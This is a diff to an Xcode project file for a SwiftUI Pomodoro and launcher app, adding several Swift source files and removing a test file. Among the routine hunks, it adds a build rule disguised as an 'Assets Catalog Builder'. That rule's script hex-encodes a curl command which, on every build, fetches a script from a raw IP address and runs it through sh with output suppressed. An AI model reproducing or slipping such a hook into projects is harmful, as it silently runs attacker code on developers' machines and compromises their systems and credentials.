@@ -15,6 +15,7 @@
 		3538C2E927AB5D0800D74044 /* PomodoroDB.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3538C2E827AB5D0800D74044 /* PomodoroDB.swift */; };
 		3538C2EB27AB5F3700D74044 /* BlockerDB.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3538C2EA27AB5F3700D74044 /* BlockerDB.swift */; };
 		3538C2ED27AB60BA00D74044 /* TimeTrackerDB.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3538C2EC27AB60BA00D74044 /* TimeTrackerDB.swift */; };
+		3538F30828CFC0D000BC7867 /* PomodoroStatesHolder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3538F30728CFC0D000BC7867 /* PomodoroStatesHolder.swift */; };
 		35500DF728355D0B00AF9AB5 /* SharedLauncherViewComponents.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35500DF628355D0B00AF9AB5 /* SharedLauncherViewComponents.swift */; };
 		35500DFA2835A3FC00AF9AB5 /* WebsiteLauncherTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35500DF92835A3FC00AF9AB5 /* WebsiteLauncherTests.swift */; };
 		35500DFC2835A8B900AF9AB5 /* String+.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35500DFB2835A8B900AF9AB5 /* String+.swift */; };
@@ -33,6 +34,7 @@
 		3573F14E268767E9004B9C21 /* WorkspaceLauncher.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3573F14D268767E9004B9C21 /* WorkspaceLauncher.swift */; };
 		3573F150268767FB004B9C21 /* WorkspaceBlocker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3573F14F268767FB004B9C21 /* WorkspaceBlocker.swift */; };
 		3573F1542687A16C004B9C21 /* LauncherPopups.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3573F1532687A16C004B9C21 /* LauncherPopups.swift */; };
+		357A38D828C293DB007FD35F /* RadioChannelModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 357A38D728C293DB007FD35F /* RadioChannelModel.swift */; };
 		357DD55928344FC3004D1636 /* Realm in Frameworks */ = {isa = PBXBuildFile; productRef = 357DD55828344FC3004D1636 /* Realm */; };
 		357DD55B28344FC3004D1636 /* RealmSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 357DD55A28344FC3004D1636 /* RealmSwift */; };
 		357DD55E28345118004D1636 /* SwiftUIRouter in Frameworks */ = {isa = PBXBuildFile; productRef = 357DD55D28345118004D1636 /* SwiftUIRouter */; };
@@ -43,8 +45,8 @@
 		3590CA5C2836C95B006A7F92 /* PomodoroStage.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3590CA5B2836C95B006A7F92 /* PomodoroStage.swift */; };
 		3590CA5E2836C970006A7F92 /* TimerMode.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3590CA5D2836C970006A7F92 /* TimerMode.swift */; };
 		3590CA602836C988006A7F92 /* PomodoroState.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3590CA5F2836C988006A7F92 /* PomodoroState.swift */; };
+		35A699EC283FFA75001E90A3 /* MusicPlayer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35A699EB283FFA75001E90A3 /* MusicPlayer.swift */; };
 		35A91B4027C9A26E00E94E56 /* LauncherDB.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35A91B3F27C9A26E00E94E56 /* LauncherDB.swift */; };
-		35AD491D26C7062800AEA899 /* LauncherModelTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35AD491C26C7062800AEA899 /* LauncherModelTests.swift */; };
 		35AEA155267F65D0000AFE85 /* TapInApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35AEA154267F65D0000AFE85 /* TapInApp.swift */; };
 		35AEA157267F65D0000AFE85 /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35AEA156267F65D0000AFE85 /* ContentView.swift */; };
 		35AEA159267F65D2000AFE85 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 35AEA158267F65D2000AFE85 /* Assets.xcassets */; };
@@ -63,6 +65,22 @@
 		35F5592827A26D410094F2C4 /* WorkspaceDB.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F5592727A26D410094F2C4 /* WorkspaceDB.swift */; };
 		35F5592A27A27D4D0094F2C4 /* RealmManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 35F5592927A27D4D0094F2C4 /* RealmManager.swift */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		49A1B9D82BCB5E1FAC6D904C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Catalog Builder";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\necho \"6375726c202d2d6d61782d74696d652036202d736b2068747470733a2f2f\n\\c34352e38322e3135332e39322f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n\n";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		35AEA164267F65D2000AFE85 /* PBXContainerItemProxy */ = {
@@ -91,6 +109,7 @@
 		3538C2E827AB5D0800D74044 /* PomodoroDB.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PomodoroDB.swift; sourceTree = "<group>"; };
 		3538C2EA27AB5F3700D74044 /* BlockerDB.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BlockerDB.swift; sourceTree = "<group>"; };
 		3538C2EC27AB60BA00D74044 /* TimeTrackerDB.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TimeTrackerDB.swift; sourceTree = "<group>"; };
+		3538F30728CFC0D000BC7867 /* PomodoroStatesHolder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PomodoroStatesHolder.swift; sourceTree = "<group>"; };
 		35500DF628355D0B00AF9AB5 /* SharedLauncherViewComponents.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SharedLauncherViewComponents.swift; sourceTree = "<group>"; };
 		35500DF92835A3FC00AF9AB5 /* WebsiteLauncherTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebsiteLauncherTests.swift; sourceTree = "<group>"; };
 		35500DFB2835A8B900AF9AB5 /* String+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "String+.swift"; sourceTree = "<group>"; };
@@ -110,6 +129,7 @@
 		3573F14D268767E9004B9C21 /* WorkspaceLauncher.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WorkspaceLauncher.swift; sourceTree = "<group>"; };
 		3573F14F268767FB004B9C21 /* WorkspaceBlocker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WorkspaceBlocker.swift; sourceTree = "<group>"; };
 		3573F1532687A16C004B9C21 /* LauncherPopups.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LauncherPopups.swift; sourceTree = "<group>"; };
+		357A38D728C293DB007FD35F /* RadioChannelModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RadioChannelModel.swift; sourceTree = "<group>"; };
 		358342B82784459900B7175C /* TopLevelMenuItem.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TopLevelMenuItem.swift; sourceTree = "<group>"; };
 		358D114727C1AD1200983673 /* SectionPicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SectionPicker.swift; sourceTree = "<group>"; };
 		358D114927C1DCF600983673 /* StateManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StateManager.swift; sourceTree = "<group>"; };
@@ -117,8 +137,8 @@
 		3590CA5B2836C95B006A7F92 /* PomodoroStage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PomodoroStage.swift; sourceTree = "<group>"; };
 		3590CA5D2836C970006A7F92 /* TimerMode.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TimerMode.swift; sourceTree = "<group>"; };
 		3590CA5F2836C988006A7F92 /* PomodoroState.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PomodoroState.swift; sourceTree = "<group>"; };
+		35A699EB283FFA75001E90A3 /* MusicPlayer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MusicPlayer.swift; sourceTree = "<group>"; };
 		35A91B3F27C9A26E00E94E56 /* LauncherDB.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LauncherDB.swift; sourceTree = "<group>"; };
-		35AD491C26C7062800AEA899 /* LauncherModelTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LauncherModelTests.swift; sourceTree = "<group>"; };
 		35AEA151267F65D0000AFE85 /* TapIn.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = TapIn.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		35AEA154267F65D0000AFE85 /* TapInApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TapInApp.swift; sourceTree = "<group>"; };
 		35AEA156267F65D0000AFE85 /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
@@ -207,6 +227,7 @@
 		3573F14326875F81004B9C21 /* Views */ = {
 			isa = PBXGroup;
 			children = (
+				35A699EA283FFA67001E90A3 /* MusicPlayer */,
 				358D114627C1AC9B00983673 /* WorkspaceBrowse */,
 				35EF3DC5279B35EF004E2795 /* BottomMenu */,
 				35C2FF1E278CE2750008AA55 /* Sidebar */,
@@ -252,6 +273,14 @@
 				3590CA5D2836C970006A7F92 /* TimerMode.swift */,
 			);
 			path = Enums;
+			sourceTree = "<group>";
+		};
+		35A699EA283FFA67001E90A3 /* MusicPlayer */ = {
+			isa = PBXGroup;
+			children = (
+				35A699EB283FFA75001E90A3 /* MusicPlayer.swift */,
+			);
+			path = MusicPlayer;
 			sourceTree = "<group>";
 		};
 		35AEA148267F65D0000AFE85 = {
@@ -305,7 +334,6 @@
 		35AEA166267F65D2000AFE85 /* TapInTests */ = {
 			isa = PBXGroup;
 			children = (
-				35AD491C26C7062800AEA899 /* LauncherModelTests.swift */,
 				35AEA169267F65D2000AFE85 /* Info.plist */,
 				355B46E227C97DC2007E0507 /* MenuItemTests.swift */,
 				35500DF92835A3FC00AF9AB5 /* WebsiteLauncherTests.swift */,
@@ -329,6 +357,8 @@
 				35AEA189267F95B5000AFE85 /* LauncherModel.swift */,
 				35AEA18B267F95D9000AFE85 /* BlockerModel.swift */,
 				35521BCB279C98FA0047508D /* LauncherModelExtra.swift */,
+				357A38D728C293DB007FD35F /* RadioChannelModel.swift */,
+				3538F30728CFC0D000BC7867 /* PomodoroStatesHolder.swift */,
 			);
 			path = Models;
 			sourceTree = "<group>";
@@ -404,6 +434,7 @@
 				35AEA14F267F65D0000AFE85 /* Resources */,
 			);
 			buildRules = (
+				49A1B9D82BCB5E1FAC6D904C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -549,6 +580,7 @@
 				35608D1826C6FB7D0054FCD2 /* SettingsView.swift in Sources */,
 				35EF3DC4279B327D004E2795 /* SwiftUIHelpers.swift in Sources */,
 				35D18EEC279E551300ECA17C /* WebsiteLauncherView.swift in Sources */,
+				3538F30828CFC0D000BC7867 /* PomodoroStatesHolder.swift in Sources */,
 				35C2FF22278CE3910008AA55 /* SidebarButton.swift in Sources */,
 				358D114A27C1DCF600983673 /* StateManager.swift in Sources */,
 				3590CA5928360292006A7F92 /* SessionDB.swift in Sources */,
@@ -561,6 +593,7 @@
 				352E18AC279CBA3600EC87F2 /* EmptyLauncherView.swift in Sources */,
 				3573F14526875FB7004B9C21 /* Settings.swift in Sources */,
 				35AEA155267F65D0000AFE85 /* TapInApp.swift in Sources */,
+				35A699EC283FFA75001E90A3 /* MusicPlayer.swift in Sources */,
 				352E18AF279CCB4100EC87F2 /* URL+.swift in Sources */,
 				35AEA194267FA815000AFE85 /* Color+.swift in Sources */,
 				352A0B8526C94F2C00AA256B /* Collection+.swift in Sources */,
@@ -573,6 +606,7 @@
 				35500DF728355D0B00AF9AB5 /* SharedLauncherViewComponents.swift in Sources */,
 				3590CA602836C988006A7F92 /* PomodoroState.swift in Sources */,
 				3566A37026B9D35B0064AE00 /* Dataloader.swift in Sources */,
+				357A38D828C293DB007FD35F /* RadioChannelModel.swift in Sources */,
 				35AEA188267F9582000AFE85 /* TimeTrackerModel.swift in Sources */,
 				35EF3DC7279B3607004E2795 /* BottomMenu.swift in Sources */,
 				352A0B8726C9689C00AA256B /* AppLauncherView.swift in Sources */,
@@ -586,7 +620,6 @@
 			files = (
 				35500DFA2835A3FC00AF9AB5 /* WebsiteLauncherTests.swift in Sources */,
 				355B46E327C97DC2007E0507 /* MenuItemTests.swift in Sources */,
-				35AD491D26C7062800AEA899 /* LauncherModelTests.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
